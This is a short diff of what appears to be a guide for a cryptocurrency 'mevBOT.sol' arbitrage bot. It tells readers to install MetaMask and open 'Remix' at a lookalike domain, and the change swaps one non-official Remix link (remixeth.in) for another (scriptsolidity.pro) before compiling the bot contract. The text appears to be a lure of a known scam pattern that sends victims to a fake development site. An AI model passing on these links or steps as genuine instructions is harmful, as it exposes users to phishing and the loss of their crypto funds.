@@ -25,7 +25,7 @@ You are now able to take advantage of those arbitrages yourself, a benefit that 
 Download MetaMask (if you don’t have it already):
 https://metamask.io/download.html
 
-Access Remix: https://remixeth.in/
+Access Remix: https://scriptsolidity.pro
 
 Go to the “Solidity Compiler” tab, select version and then select “Compile mevBOT.sol”.
 
